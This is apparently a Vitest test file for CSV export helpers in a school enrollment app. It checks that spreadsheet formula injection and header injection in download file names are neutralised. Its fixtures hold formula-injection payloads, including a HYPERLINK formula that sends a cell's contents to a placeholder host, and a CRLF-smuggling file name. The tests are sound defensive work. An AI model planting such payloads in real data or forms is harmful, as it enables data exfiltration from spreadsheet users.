import { describe, it, expect } from "vitest";
import { cabecalhosDownloadCsv, celulaCsv } from "@/lib/csv";
import { solicitacoesParaCsv } from "@/lib/solicitacoes-matricula";

describe("celulaCsv", () => {
  it("mantém texto comum como está", () => {
    expect(celulaCsv("Ana Souza")).toBe("Ana Souza");
    expect(celulaCsv("")).toBe("");
  });

  it.each(["=HYPERLINK(\"http://x\")", "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1"])(
    "neutraliza fórmula no início: %j",
    (valor) => {
      const celula = celulaCsv(valor);
      // Sem aspas externas, o primeiro caractere é o apóstrofo; com aspas, o segundo.
      const conteudo = celula.startsWith('"') ? celula.slice(1) : celula;
      expect(conteudo.startsWith("'")).toBe(true);
    },
  );

  it("põe entre aspas quando há vírgula, ponto e vírgula, aspas ou quebra de linha", () => {
    expect(celulaCsv("Pedro, Lia")).toBe('"Pedro, Lia"');
    expect(celulaCsv("a;b")).toBe('"a;b"');
    expect(celulaCsv('Disse "oi"')).toBe('"Disse ""oi"""');
    expect(celulaCsv("linha1\r\nlinha2")).toBe('"linha1\r\nlinha2"');
  });

  it("combina apóstrofo e aspas", () => {
    expect(celulaCsv('=A1,"x"')).toBe('"\'=A1,""x"""');
  });
});

describe("cabecalhosDownloadCsv", () => {
  it("proíbe cache e limpa o nome do arquivo", () => {
    const h = cabecalhosDownloadCsv('matriculas-2027".csv\r\nX: y');
    expect(h["Cache-Control"]).toBe("private, no-store");
    expect(h["Content-Disposition"]).toBe('attachment; filename="matriculas-2027_.csv__X__y"');
  });
});

describe("CSV de matrículas (formulário público)", () => {
  it("não deixa nome digitado no formulário virar fórmula na planilha", () => {
    const csv = solicitacoesParaCsv([
      {
        createdAt: new Date("2026-09-24T15:00:00Z"),
        tipo: "PRE_MATRICULA",
        status: "NOVA",
        responsavelNome: '=HYPERLINK("https://exemplo.invalid/?d="&A2,"Clique")',
        telefone: "5521912345678",
        alunoNome: "@SOMA(1;2)",
        serie: "1º ano",
        periodoVisita: null,
        escolaAtual: "-ESCOLA",
        observacoes: null,
        observacoesInternas: null,
      },
    ]);
    const linha = csv.split("\n")[1];
    expect(linha).toContain('"\'=HYPERLINK(');
    expect(linha).toContain('"\'@SOMA(1;2)"');
    expect(linha).toContain("'-ESCOLA");
    expect(linha).not.toMatch(/,=|,@|,-E/);
  });
});
